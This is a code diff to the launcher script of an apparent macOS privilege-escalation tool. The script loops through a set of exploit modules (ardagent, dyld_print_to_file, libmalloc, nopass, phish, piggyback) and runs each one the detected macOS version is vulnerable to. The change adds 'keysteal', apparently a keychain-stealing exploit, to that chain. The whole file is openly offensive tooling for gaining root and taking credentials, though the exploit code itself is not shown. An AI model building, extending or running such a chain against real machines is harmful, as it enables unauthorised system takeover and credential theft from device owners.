@@ -2,8 +2,8 @@
 import platform
 from distutils.version import LooseVersion
 
-from exploits import (ardagent, dyld_print_to_file, libmalloc, nopass, phish,
-                      piggyback)
+from exploits import (ardagent, dyld_print_to_file, keysteal, libmalloc, nopass,
+                      phish, piggyback)
 
 REDC = "\033[91m[-] "
 YELLOWC = "\033[93m[!] "
@@ -16,7 +16,7 @@ def main():
     """main function"""
     version = platform.mac_ver()[0]
     print(GREENC + "Trying to escalate privileges on macOS %s..." % version + ENDC)
-    for exploit in [ardagent, dyld_print_to_file, libmalloc, nopass, piggyback, phish]:
+    for exploit in [ardagent, dyld_print_to_file, libmalloc, nopass, piggyback, keysteal, phish]:
         if not all(ex in dir(exploit) for ex in ["vulnerable", "run"]):
             continue
         if not exploit.vulnerable(LooseVersion(version)):
